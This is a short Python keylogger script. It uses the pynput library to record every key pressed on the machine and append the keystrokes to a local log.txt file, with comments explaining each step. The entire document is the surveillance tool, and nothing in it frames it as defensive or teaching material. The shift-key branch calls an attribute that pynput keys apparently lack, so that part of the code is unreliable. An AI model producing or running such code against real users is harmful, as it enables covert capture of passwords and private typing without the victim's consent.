#--------------------------------------------#
#                 -keylogger-                #
#                                            #
#     Goal of the keylogger is to store      # 
#     keystrokes of the user                 #
#     in a text file                         #
#                                            #
#--------------------------------------------#

#import pynput to monitor keystrokes
from os import write
from pynput.keyboard import Listener

#Defining write to a file by the press of a key
def writetofile(key):

    #assigns keydata with the string key
    keydata = str(key)

    #open the log txt file and appends new data to file
    with open("log.txt", "a") as f:
        if hasattr(key, "char"):
            #this will write normal letters and numbers
            f.write(key.char)

        #if space key is pressed then log a space
        elif (key == key.space):
                f.write(" ")
        #if enter key is pressed create a new line in txt file
        elif (key == key.enter):
            f.write("\n");

        elif (key == key.shift):
            f.write(key.uppercase)

        pass
  

#listen monitors key input and joins
with Listener(writetofile) as l:
    l.join()